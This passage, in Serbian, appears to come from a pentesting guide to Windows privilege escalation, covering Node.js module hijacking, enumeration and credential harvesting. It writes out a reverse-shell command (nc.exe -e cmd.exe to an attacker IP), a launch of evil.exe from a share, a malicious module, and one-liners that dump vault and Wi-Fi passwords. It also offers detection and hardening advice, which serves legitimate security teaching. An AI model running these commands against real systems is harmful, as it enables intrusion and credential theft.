Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking razrešavanja Node.js / Electron modula preko `C:\node_modules`

Ovo je varijanta **Windows uncontrolled search path** koja utiče na aplikacije **Node.js** i **Electron** kada izvrše nequalifikovani import, kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

Node razrešava pakete tako što se kreće nagore kroz stablo direktorijuma i proverava fascikle `node_modules` u svakom nadređenom direktorijumu. U Windowsu, to kretanje može dosegnuti koren diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može završiti proveravanjem sledećih lokacija:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** pokuša da razreši nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, pa ovo predstavlja **LPE** kada se cilj pokreće kao administrator, iz zakazanog zadatka/servisnog omotača sa povišenim privilegijama ili iz privilegovane desktop aplikacije koja se automatski pokreće.

Ovo se naročito često dešava kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavija `require("foo")` u `try/catch` i nastavlja rad nakon greške
- je paket uklonjen iz produkcionih verzija, izostavljen tokom pakovanja ili instalacija nije uspela
- se ranjivi `require()` nalazi duboko u stablu zavisnosti umesto u glavnom kodu aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da potvrdite putanju razrešavanja:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka cilja (`node.exe`, EXE Electron aplikacije ili proces omotača)
- Filtrirajte po `Path` `contains` `node_modules`
- Usredsredite se na `NAME NOT FOUND` i poslednje uspešno otvaranje u okviru `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregledom izvornog koda.
2. Kreirajte root direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Ubacite modul pod tačno očekivanim imenom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Stvarni primeri nedostajućih opcionih modula koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo upotrebiti: pronađite bilo koji **nedostajući bare import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i ojačavanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili upisuje nove `.js` datoteke/pakete u njega.
- Potražite procese sa visokim integritetom koji čitaju iz `C:\node_modules\*`.
- U produkciji uključite sve runtime zavisnosti i proverite upotrebu `optionalDependencies`.
- Pregledajte kod trećih strana zbog obrazaca tihog `try { require("...") } catch {}`.
- Onemogućite opcione provere ako biblioteka to podržava (na primer, neka `ws` okruženja mogu da izbegnu zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts datoteka

Proverite da li su u hosts datoteci hardkodirani drugi poznati računari.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite spolja da li postoje **usluge sa ograničenim pristupom**.

```bash
netstat -ano #Opened ports?
```

Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i servisom ili zakazanim zadatkom koji ga pokreće. Servis za daljinsku kontrolu može da omogući pristup kao njegov desktop korisnik samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija koja radi pod nalogom sa višim privilegijama zaseban je cilj za proveru: listener i putanja do binarne datoteke predstavljaju pasivne tragove, dok putanja za autentifikovano iskorišćavanje oštećenja memorije zahteva analizu te konkretne binarne datoteke i ulaza koji joj je dostupan. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što utvrdite koja je pozadinska usluga u pitanju; samo pravilo za prosleđivanje ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall pravila

[**Pogledajte ovu stranicu za komande povezane sa Firewall-om**](../basic-cmd-for-pentesters.md#firewall) **(prikaz pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više [komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarni fajl `bash.exe` može se pronaći i u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete osluškivati na bilo kom portu (kada prvi put upotrebite `nc.exe` za osluškivanje na portu, grafički interfejs će vas pitati da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da istražite `WSL` sistem datoteka u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje Windows administratorska prava. Ako trenutni Windows identitet može da čita sistem datoteka neke distribucije, pregledajte fajlove istorije shell-a (uključujući `/root/.bash_history`) i potražite komande koje su možda zabeležile akreditive; za eskalaciju je i dalje potreban važeći nalog sa višim privilegijama i dozvoljen put za autentifikaciju. Raspored `LocalState\rootfs` važi za starije instalacije WSL-a; WSL 2 obično čuva distribuciju na [virtuelnom disku `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), pa prvo utvrdite koja je distribucija u pitanju i gde se nalazi njena memorija. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog nabrajanja.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao akreditive. Vrednost `DefaultPassword` ili `AltDefaultPassword` koja nije prazna predstavlja nalaz plaintext vrednosti u registry-ju. Ako je `AutoAdminLogon=1`, ali plaintext lozinka nije čitljiva, to je samo trag: [Sysinternals Autologon može da čuva lozinku kao LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a uobičajeno čitanje registry-ja ne potvrđuje da li taj secret postoji niti da li se može preuzeti. Proverite prava pristupa i stvarnu konfiguraciju logon-a pre nego što prijavite izlaganje akreditiva.

### Upravljač akreditivima / Windows vault

Iz [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled, moglo bi se pomisliti da korisnici mogu da čuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail, pa da se pregledači automatski prijavljuju, ali to ne funkcioniše tako.

Windows Vault čuva akreditive koje Windows može da koristi za automatsko prijavljivanje korisnika, što znači da svaka **Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault, kao i da koristi dostavljene akreditive umesto da korisnici svaki put unose korisničko ime i lozinku.

Osim ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za određeni resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa credential manager-om i zatraži akreditive za taj resurs** iz podrazumevanog vault-a za skladištenje.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na mašini.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete koristiti `runas` sa opcijom `/savecred` da biste upotrebili sačuvane akreditive. Sledeći primer pokreće udaljenu binarnu datoteku preko SMB deljenog resursa.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` uz unapred obezbeđene akreditive.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu da to možete uraditi pomoću alata mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili pomoću [modula Powershells za Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP aplikacije, Microsoft Edge i moderni sistemski servisi čuvaju tokene za autentifikaciju i lozinke u čistom tekstu unutar UWP `PasswordVault`-a (dostupnog i kao `Web Credentials` u alatu `vaultcmd`). Ovaj prostor za skladištenje izolovan je po sesiji i može se dešifrovati nativno, bez administratorskih prava ili privilegije `SeDebugPrivilege`.

Izvršite ovu PowerShell komandu u aktivnoj sesiji korisnika da biste odmah dump-ovali i dešifrovali sva sačuvana korisnička imena i lozinke u čistom tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka i pretežno se koristi u operativnom sistemu Windows za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi korisničku ili sistemsku tajnu kao značajan doprinos entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisnikovih tajni za prijavu**. U slučajevima kada se koristi sistemsko šifrovanje, koristi tajne za autentifikaciju sistema na domenu.

Šifrovani korisnički RSA ključevi, šifrovani pomoću DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, smešten zajedno sa glavnim ključem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa se njegov sadržaj ne može prikazati pomoću komande `dir` u CMD-u, ali može kroz PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

Fajlovi sa akreditivima zaštićeni glavnom lozinkom obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz module** `dpapi::cred` uz odgovarajući `/masterkey` za dešifrovanje.\
Možete **izvući mnogo DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i automatizaciju kao praktičan način za čuvanje šifrovanih akreditiva. Akreditive štiti **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kom su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili putanju `.xml`. Kada skripta ili inventar datoteka ukaže na njega, pronađite stvarni direktorijum profila naloga umesto da pretpostavite da je to `C:\Users`: [Windows može da smesti profile na druga mesta](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka samo je trag; [Windows `Export-Clixml` vezuje šifrovani akreditiv za korisnika i računar koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a svaki oporavljeni nalog mora zasebno da ima važeća prava na predviđenoj usluzi. Najpre proverite putanje i ACL-ove, bez ispisivanja šifrovanih ili čistih vrednosti tokom uobičajenog popisivanja.

Da biste **dešifrovali** PS akreditiv iz datoteke koja ga sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Upravljač akreditivima za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul **Mimikatz** `dpapi::rdg` sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Možete da **izvučete mnogo DPAPI masterkey-eva** iz memorije pomoću modula Mimikatz `sekurlsa::dpapi`

**mRemoteNG koristi drugačije skladište veza.** Pregledajte čitljive XML datoteke u `%APPDATA%\mRemoteNG` i korisničkom direktorijumu Documents, uključujući datoteke uobičajenih naziva kao što je `config.xml`. Utvrdite šemu veza i šifrovane atribute `Password` pre nego što XML datoteku smatrate tragom do akreditiva. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom široke enumeracije.

**Izvezi profila Remote Desktop Plus** mogu biti čitljivi i u korisničkim direktorijumima ili deljenom direktorijumu za administraciju. Zastareli izvoz `profiles.xml` sadrži stavke `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Neprazan element lozinke tretirajte kao trag do akreditiva, nemojte ga ispisivati niti pretpostavljati da je u čistom tekstu: [napomene proizvođača](https://www.donkz.nl/) navode da zaštita profila može biti vezana za nalog i računar na kojima je profil napravljen ili podešena manje strogo. Proverite poreklo datoteke i uslove oporavka pre nego što se oslonite na nju.

### Sticky Notes

Ljudi često koriste aplikaciju StickyNotes na Windows radnim stanicama da bi **sačuvali lozinke** i druge informacije, ne shvatajući da je reč o datoteci baze podataka. Datoteka se nalazi na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi potražiti je i pregledati.

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes najčešće čuva beleške na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili drugačije aplikacije mogu da koriste druga skladišta u korisničkom profilu, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladišta koristi pre nego što odsustvo SQLite datoteke protumačite kao dokaz da beleški nema.

Ako Sticky Notes koristi SQLite write-ahead logging, kopija same datoteke `plum.sqlite` može da izostavi nedavno potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` zajedno sa konzistentnom kopijom baze podataka i uključite `plum.sqlite-shm` ako je dostupna; indeks deljene memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite-ovu dokumentaciju za WAL](https://www.sqlite.org/wal.html). Beleška koja sadrži ime naloga ili lozinku samo je trag do akreditiva: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Šifrovani zapis iz menadžera lozinki zahteva i stvarni ključ za dešifrovanje i tumačenje specifično za aplikaciju pre nego što može da potvrdi prijavu sa višim privilegijama.

### AppCmd.exe

**Imajte na umu da morate biti Administrator i pokrenuti AppCmd.exe sa nivoom integriteta High da biste oporavili lozinke.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **akreditivi** koje je moguće **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instalateri se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Fajlovi i registar (akreditivi)

### Registry artefakti akreditiva alata za podršku

Neke starije instalacije alata za udaljenu podršku zadržavaju nazive vrednosti povezane sa lozinkama pod fiksnim ključevima registra aplikacije. Na primer, prema [objašnjenju proizvođača o ključu registra](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` u verzijama TeamViewer-a pre verzije 9 označavao je konfigurisanu statičku lozinku sesije. Oznaka u nazivu vrednosti samo je trag za proveru: pre procene akreditiva proverite instaliranu verziju, da li su podaci vrednosti čitljivi, njihov format i trenutno ponašanje autentifikacije. Prelazak sa lozinke za udaljenu podršku na privilegovaniji Windows nalog zahteva i stvarno ponovno korišćenje lozinke, kao i ovlašćenje za taj nalog. Šifrovani tekst i otkrivene lozinke ne uključujte u rutinski izlaz enumeracije.

### Deljene proračunske tabele sa zaštićenim listovima

Ako se sumnja da čitljiva deljena radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje datoteke** od zaštite lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita lista ograničava uređivanje i nije bezbednosna funkcija; sama po sebi ne potvrđuje da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene i relevantne datoteke i izbegavajte ispisivanje mogućih tajni tokom široke enumeracije. Čitljiva putanja do `.xlsx` datoteke, zaštićen list ili skrivena kolona sami po sebi ne dokazuju da akreditivi postoje niti da neki nalog ima veće privilegije; zasebno proverite stvarne podatke i trenutna prava naloga.

### Sačuvane zakrpe izmena CI servera

CI server može da zadrži poslate izvorne izmene u svom direktorijumu sa podacima i nakon završetka izgradnje. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) da se `system/changes` koristi za čuvanje izmena iz udaljenih pokretanja; direktorijum sa podacima može da se konfiguriše i ne mora da se nalazi u okviru `ProgramData`. Čitljiva zakrpa može da sačuva uklonjene ili dodate reference na datoteku akreditiva, ključ za šifrovanje ili skriptu koja koristi oboje. Na primer, PowerShell tok rada `ConvertTo-SecureString -Key` zahteva AES ključ, kao i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ navodi zasebno. Prvo pregledajte samo dostupne nazive zakrpa, a zatim uz odgovarajuće ovlašćenje proverite relevantan sadržaj, bez ispisivanja tajni u rutinskom izlazu enumeracije. Putanja do zakrpe, šifrovana vrednost ili referenca na ključ same po sebi ne dokazuju da su akreditivi važeći niti da omogućavaju pristup sa većim privilegijama. Ograničite ACL-ove direktorijuma sa podacima i izbegavajte unošenje tajni u izmene izgradnje.

### Rotacija prilagođene lozinke lokalnog administratora

Domaće rešenje za rotaciju lozinki može da čuva šifrovanu lozinku lokalnog administratora u lokalnoj usluzi, a da akreditive za skladište podataka drži u čitljivoj datoteci `.env` ili pored binarne datoteke programa za ažuriranje. Zajedno proverite planirani zadatak programa za ažuriranje, nalog, ACL-ove konfiguracije, listener i dozvole skladišta podataka. Skladištu podataka dostupnom samo preko loopback adrese i dalje može da pristupi lokalni korisnik koji ima važeće akreditive, ali sama autentifikacija ne dokazuje da korisnik ima dozvolu za čitanje relevantnih zapisa. Ako su seme za šifrovanje ili ključni materijal dostupni pored šifrovanog teksta, proverite tačan postupak izvođenja ključa pre nego što se pouzdate u šifrovanje. Šema koja deterministički izvodi AES ključ iz otkrivenog semena koristeći Go [`math/rand`](https://pkg.go.dev/math/rand) nije pogodna za zaštitu te lozinke; Go navodi da taj paket nije namenjen za nasumičnost osetljivu sa bezbednosnog stanovišta. Pre nego što otkrivenu lozinku smatrate putem za eskalaciju privilegija, potvrdite da je važeća i da pripada nalogu iz lokalne grupe Administrators. Planirani zadatak, putanja do `.env` datoteke ili šifrovani blob sami po sebi ne dokazuju nijedan od tih uslova. Lozinke i ključni materijal ne uključujte u rutinski izlaz enumeracije.

Za upravljanje lozinkama lokalnog administratora koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Njegovo skladištenje u direktorijumu ili usluzi Entra i kontrole pristupa razlikuju se od prilagođenog lokalnog skladišta podataka; [uloge Elasticsearch-a](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik skladišta podataka može da čita određeni indeks.

### Arhive dodataka Java servera i ponovno korišćenje akreditiva

Neki dodaci za Java servere distribuiraju se kao JAR arhive u direktorijumu `plugins` servera. Čitljiv prilagođeni dodatak može da sadrži konfiguraciju ili bajtkod sa ugrađenim akreditivom usluge. Arhivu pregledajte samo uz ovlašćenje i ne uključujte otkrivene tajne u rutinski izlaz enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a otkrivena lozinka usluge vodi do većih privilegija samo ako važi i za privilegovaniji nalog. Proverite ACL-ove relevantnih datoteka i zamenite ponovo korišćene akreditive jedinstvenim tajnama. Pogledajte [PaperMC vodič za instalaciju dodataka](https://docs.papermc.io/paper/adding-plugins/) za raspored direktorijuma i [Oracle dokumentaciju za JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) za sadržaj arhive.

### Akreditivi ugrađene baze podataka Openfire-a

Instalacija Openfire-a koja koristi ugrađenu bazu podataka može da čuva `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da je čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. Openfire [dokumentacija za dobavljača korisnika](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da se lozinke mogu čuvati u otvorenom tekstu ili šifrovati ključem koji se nalazi u tom svojstvu. Otkrivena lozinka važna je za eskalaciju privilegija samo ako još važi za privilegovaniji identitet; sam naziv datoteke ne dokazuje ni pristup za čitanje ni ponovno korišćenje akreditiva. Putanja služi kao smernica za inventarisanje, zato sadržaj baze podataka i akreditive ne uključujte u rutinski izlaz enumeracije.

Zasebna datoteka `Openfire\conf\openfire.xml` može da otkrije konfigurisane portove i interfejs za vezivanje administratorske konzole čak i kada se koristi eksterna baza podataka. Openfire obično vezuje administratorsku konzolu za loopback; lokalni nalog i dalje može da pristupi toj adresi ako listener radi. Zajedno proverite stvarni listener, ovlašćenu administratorsku ulogu, pravila za otpremanje dodataka i identitet Openfire usluge. Administrator koji može da instalira dodatak može da izazove izvršavanje njegovog koda u kontekstu usluge, što može imati visoke privilegije ako se usluga izvršava kao LocalSystem. Podudaranje lozinke naloga ili čitljiva putanja do konfiguracije sami po sebi ne dokazuju pristup administratorskoj konzoli niti izvršavanje koda. Pogledajte [proizvođačev vodič za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [svojstvo API-ja za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija servera za forenzičko upravljanje

Konfiguracije servera Velociraptor, koje se obično zovu `server.config.yaml`, mogu da sadrže `CA.private_key` interne CA. Ako korisnik sa nižim privilegijama može da čita taj ključ, možda može da izda API klijentski sertifikat. Da li to vodi do većih privilegija zavisi od korisničkih uloga servera, dostupnosti API-ja i identiteta pod kojim se izvršava server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njeno pronalaženje ne potvrđuje pristup CA servera. U nekim instalacijama privatni ključ CA čuva se van mreže, pa čitljiva konfiguracija servera možda ne sadrži ni ključ za potpisivanje.

